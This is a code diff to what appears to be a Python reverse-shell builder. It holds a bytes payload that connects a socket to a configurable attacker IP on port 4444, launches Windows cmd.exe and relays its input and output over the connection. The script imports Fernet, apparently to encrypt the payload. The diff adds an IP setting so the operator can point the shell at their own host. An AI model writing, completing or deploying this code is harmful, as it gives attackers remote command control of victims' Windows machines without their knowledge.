@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet
 from os import system
-
+IP = "0.0.0.0" # Put IP here
+#Port = "4444" Might mess stuff up
 payload = b'''
 import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror
 
@@ -25,7 +26,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("IP",4444))
+s.connect((IP,4444))
 
 p=subprocess.Popen(['\\windows\system32\\cmd.exe'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=0)
  
